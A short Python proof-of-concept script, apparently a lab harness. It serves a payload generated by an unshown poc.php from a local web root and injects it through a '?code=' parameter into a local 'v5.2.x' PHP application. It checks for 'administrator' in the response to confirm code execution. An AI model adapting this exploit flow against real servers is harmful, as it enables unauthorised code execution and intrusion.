#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
desc:
author: huha
'''
import requests
with open ('poc.php','rb') as f:
    bstr = f.read()
with open('D:\phpstudy\PHPTutorial\WWW\poc.php','wb') as f:
    f.write(bstr)

r = requests.get("http://127.0.0.1/poc.php",timeout=1)
code = r.content.decode()

url = 'http://localhost/v5.2.x/public/index.php'
payload = '/?code={}'.format(code)

r = requests.get(url+payload)
if 'administrator' in r.content.decode():
    print('OK!!!')
